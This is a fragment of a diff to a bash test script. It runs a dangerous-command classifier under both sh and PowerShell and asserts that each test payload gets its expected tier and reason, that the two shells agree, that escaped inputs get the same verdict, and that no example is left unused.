+        sh)  bash "$REPO_ROOT/scripts/dangerous-commands.sh" < "$_dc_tmp/$_dc_n1.json" > "$_dc_tmp/$_dc_n1.out" 2>/dev/null & ;;
+        ps1) pwsh -NonInteractive -File "$_dc_ps1" < "$_dc_tmp/$_dc_n1.json" > "$_dc_tmp/$_dc_n1.out" 2>/dev/null & ;;
+    esac
+    [ $((_dc_n1 % 8)) -eq 0 ] && wait
+done
+wait
+declare -A _dc_V=()
+for _dc_j in "${!_dc_J_shell[@]}"; do
+    _dc_n1=$((_dc_j + 1))
+    _dc_V[${_dc_J_shell[$_dc_j]}|${_dc_J_payload[$_dc_j]}]=$(_dc_line "$(cat "$_dc_tmp/$_dc_n1.out" 2>/dev/null)")
+done
+rm -r "$_dc_tmp"
+
+# ── phase 3: assertions ──
+for _dc_i in "${!_dc_R_kind[@]}"; do
+    _dc_kd=${_dc_R_kind[$_dc_i]}; _dc_p=${_dc_R_payload[$_dc_i]}
+    if [ "$_dc_kd" = "x" ]; then
+        assert_equals "$(_dc_tier "${_dc_V[ps1|$_dc_p]}")" "${_dc_R_want[$_dc_i]}" \
+            "sh/ps1 parity: [$_dc_p] gets the same tier from both shells"
+        continue
+    fi
+    _dc_plain=${_dc_V[$_dc_kd|$_dc_p]}
+    assert_equals "$(_dc_tier "$_dc_plain")" "${_dc_R_want[$_dc_i]}" "$_dc_kd: [$_dc_p] reaches its row's tier (${_dc_R_label[$_dc_i]})"
+    assert_contains "$_dc_plain" "$(_dc_ascii "${_dc_R_reason[$_dc_i]}")" "$_dc_kd: [$_dc_p] is answered by its own row"
+    assert_equals "${_dc_V[$_dc_kd|$(_dc_escape "$_dc_p")]}" "$_dc_plain" "$_dc_kd: [$_dc_p] gets the same verdict escaped"
+done
+
+# Guard 2's other half: an example whose row is gone is a stale row pairing, not a spare.
+for _dc_key in "${!_dc_ex[@]}"; do
+    case "$_dc_key" in ps1:*) [ "$_dc_have_ps1" = "1" ] || continue ;; esac
+    [ -n "${_dc_ex_used[$_dc_key]+x}" ]
+    assert_exit_zero "$?" "example $_dc_key is consumed by a regex row"
+done
+
 
 # ── mirror parity: scripts/ and templates/scripts/ must not drift ──────────────────────────
 # WHY here: the cross-shell parity block above already records that this repo has shipped a
